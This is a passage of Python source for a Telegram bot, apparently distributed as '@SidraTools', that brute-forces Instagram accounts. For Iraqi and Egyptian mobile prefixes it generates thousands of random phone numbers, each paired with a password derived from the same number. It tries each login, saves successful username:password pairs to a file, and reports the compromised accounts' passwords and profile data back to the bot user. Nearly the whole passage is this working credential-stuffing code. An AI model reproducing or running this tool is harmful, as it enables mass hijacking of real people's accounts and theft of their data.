                R2 = ("+96476"+str(S2)+":076"+str(S2))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(R2)+"\n")
                S3 = random.randint(10000000, 99999999)
                R3 = ("+96475"+str(S3)+":075"+str(S3))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(R3)+"\n")
                S4 = random.randint(1000000, 9999999)
                R4 = ("+964770"+str(S4)+":0770"+str(S4))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(R4)+"\n")
                Y1= random.randint(1000000, 9999999)
                H1= ("+964750"+str(Y1)+":0750"+str(Y1))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(H1)+"\n")
                Y2 = random.randint(1000000, 9999999)
                H2 = ("+964780"+str(Y2)+":0780"+str(Y2))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(H2)+"\n")
                Y3 = random.randint(1000000, 9999999)
                H3 = ("+964751"+str(Y3)+":0751"+str(Y3))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(H3)+"\n")
                Y4 = random.randint(1000000, 9999999)
                H5 = ("+964781"+str(Y4)+":0781"+str(Y4))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(H5)+"\n")
                Y6 = random.randint(1000000, 9999999)
                H6 = ("+964772"+str(Y6)+":0772"+str(Y6))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(H6)+"\n")
                Y7 = random.randint(1000000, 9999999)
                H7 = ("+964775"+str(Y7)+":0775"+str(Y7))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(H7)+"\n")
                Y8 = random.randint(1000000, 9999999)
                H8 = ("+964783"+str(Y8)+":0783"+str(Y8))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(H8)+"\n")
                
                
        	
            #print
            
        Combo()
		
			
					
		
        ELEzz = open('.txt', 'r')
        while True:
            APK = ELEzz.readline().split('\n')[0]
            if APK == '':
                bot.send_message(call.message.chat.id, "Examination is over ✓")
                break
            username = APK.split(':')[0]
            password = APK.split(':')[1]
            
            response = long.Instalogin(str(username),str(password)) 
            if (response) ==True:
                ok+=1
                sessionid = open("sessionid.txt", "r").readline().split('\n')[0]
                user = long.username(str(sessionid))
                followers = long.followers(str(user))
                following = long.following(str(user))
                post = long.posts(str(user))
                data = long.data(str(user))
                bot.send_message(call.message.chat.id,"‹ ɪɴѕᴛᴀɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ ✓\n────── • ✧✧ • ──────\n‹ ᴜѕᴇʀɴᴀᴍᴇ : "+str(user)+"\n‹ ᴘᴀѕѕᴡᴏʀᴅ : "+str(password)+"\n‹ ғᴏʟʟᴏᴡᴇʀѕ : "+str(followers)+"\n‹ ғᴏʟʟᴏᴡɪɴɢ : "+str(following)+"\n‹ ᴘᴏѕᴛ : "+str(post)+"\n‹ ᴅᴀᴛᴀ  : "+str(data)+"\n────── • ✧✧ • ──────\n• @SidraTools")
                f=open('Ok.txt','a')
                f.write(username+":"+password+"\n")
                f.close()
            elif (response) ==False:
                cp+=1
                bot.send_message(call.message.chat.id,"‹ ɪɴѕᴛᴀɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ ×\n────── • ✧✧ • ──────\n‹ ᴜѕᴇʀɴᴀᴍᴇ : "+str(username)+"\n‹ ᴘᴀѕѕᴡᴏʀᴅ : "+str(password)+"\n────── • ✧✧ • ──────\n• @SidraTools")
            #print
            
            elif (response) ==None:
                erorr+=1
                Mas = SidraTools.InlineKeyboardMarkup(row_width=1)
                
                Ms2 = SidraTools.InlineKeyboardButton("‹ ɢᴏᴏᴅ : "+str(ok), callback_data="ER1")
                Ms3 = SidraTools.InlineKeyboardButton("‹ ʙᴀɴᴅ : "+str(cp), callback_data="ER2")
                Ms4 = SidraTools.InlineKeyboardButton("‹ ᴛᴇѕᴛ : "+str(erorr), callback_data="ER3")
                Ms5 = SidraTools.InlineKeyboardButton("‹ ʙᴀᴄᴋ", callback_data="SidraTools")
                Ms6 = SidraTools.InlineKeyboardButton('المطور', url='https://t.me/SidraTools')
                Mas.add(Ms2,Ms3,Ms4,Ms5,Ms6)
                bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text="‹ ⌯ ѕᴛᴀʀᴛ-ᴄʜᴇᴄᴋᴇʀ\n‹ ⌯ ᴄᴏᴜɴᴛʀʏ : ɪʀᴀǫ 🇮🇶",reply_markup=Mas)
                
			#print
    elif call.data == "Egypt": #egpyt
        bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text='‹ ᴘʟᴇᴀѕᴇ ᴡᴀɪᴛ ᴀ ᴍɪɴᴜᴛᴇ....')
        os.system('rm -rf .txt')
        def Combo():
        	
            for lik in range(2500):
                x1= random.randint(10000000, 99999999)
                z1= ("+2010"+str(x1)+":010"+str(x1))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(z1)+"\n")
                x2 = random.randint(10000000, 99999999)
                z2 = ("+2011"+str(x2)+":011"+str(x2))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(z2)+"\n")
                x3 = random.randint(10000000, 99999999)
                z3 = ("+2012"+str(x3)+":012"+str(x3))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(z3)+"\n")
                x4 = random.randint(10000000, 99999999)
                z5 = ("+2015"+str(x4)+":015"+str(x4))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(z5)+"\n")
                
            #print
            
        Combo()
		
			
					
		
        ELEzz = open('.txt', 'r')
        while True:
            APK = ELEzz.readline().split('\n')[0]
            if APK == '':
                bot.send_message(call.message.chat.id, "Examination is over ✓")
                break
            username = APK.split(':')[0]
            password = APK.split(':')[1]
            
            response = long.Instalogin(str(username),str(password)) 
            if (response) ==True:
                ok+=1
                sessionid = open("sessionid.txt", "r").readline().split('\n')[0]
                user = long.username(str(sessionid))
                followers = long.followers(str(user))
                following = long.following(str(user))
                post = long.posts(str(user))
                data = long.data(str(user))
                bot.send_message(call.message.chat.id,"‹ ɪɴѕᴛᴀɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ ✓\n────── • ✧✧ • ──────\n‹ ᴜѕᴇʀɴᴀᴍᴇ : "+str(user)+"\n‹ ᴘᴀѕѕᴡᴏʀᴅ : "+str(password)+"\n‹ ғᴏʟʟᴏᴡᴇʀѕ : "+str(followers)+"\n‹ ғᴏʟʟᴏᴡɪɴɢ : "+str(following)+"\n‹ ᴘᴏѕᴛ : "+str(post)+"\n‹ ᴅᴀᴛᴀ  : "+str(data)+"\n────── • ✧✧ • ──────\n• @SidraTools")
                f=open('Ok.txt','a')
                f.write(username+":"+password+"\n")
                f.close()
            elif (response) ==False:
                cp+=1
                bot.send_message(call.message.chat.id,"‹ ɪɴѕᴛᴀɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ ×\n────── • ✧✧ • ──────\n‹ ᴜѕᴇʀɴᴀᴍᴇ : "+str(username)+"\n‹ ᴘᴀѕѕᴡᴏʀᴅ : "+str(password)+"\n────── • ✧✧ • ──────\n• @SidraTools")
            #print
            
            elif (response) ==None:
                erorr+=1
                Mas = SidraTools.InlineKeyboardMarkup(row_width=1)
                
                Ms2 = SidraTools.InlineKeyboardButton("‹ ɢᴏᴏᴅ : "+str(ok), callback_data="ER1")
                Ms3 = SidraTools.InlineKeyboardButton("‹ ʙᴀɴᴅ : "+str(cp), callback_data="ER2")
                Ms4 = SidraTools.InlineKeyboardButton("‹ ᴛᴇѕᴛ : "+str(erorr), callback_data="ER3")
                Ms5 = SidraTools.InlineKeyboardButton("‹ ʙᴀᴄᴋ", callback_data="SidraTools")
                Ms6 = SidraTools.InlineKeyboardButton('المطور', url='https://t.me/SidraTools')
                Mas.add(Ms2,Ms3,Ms4,Ms5,Ms6)
                bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text="‹ ⌯ ѕᴛᴀʀᴛ-ᴄʜᴇᴄᴋᴇʀ\n‹ ⌯ ᴄᴏᴜɴᴛʀʏ : ᴇɢʏᴘᴛ 🇪🇬",reply_markup=Mas)
                
			#print
        
    #print
    elif call.data == "0":
        bot.send_message(call.message.chat.id, "➤ :⌯ Follow Me ➤ : SidraELEzz\n=====================\n➤ :My channels\n=====================\n➤ : @O1OOB\n➤ : @TT_RQ\n➤ : @UUU0UB\n➤ : @SidraTools\n➤ : @O0O10OK\n=====================\n➤ : BOTS\n=====================\n➤ : @SS_SS_1\n➤ : @saydr_0_bot\n➤ : @TOOLS_Termux_BOT\n=====================")
    


if __name__ == "__main__":
    bot.polling(none_stop=True)

@server.route(f"/{BOT_TOKEN}", methods=["POST"])
def redirect_message():
    json_string = request.get_data().decode("utf-8")
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200

if __name__ == "__main__":
    bot.remove_webhook()
    bot.set_webhook(url="https://secure-plateau-60675.herokuapp.com/"+str(BOT_TOKEN))
    server.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
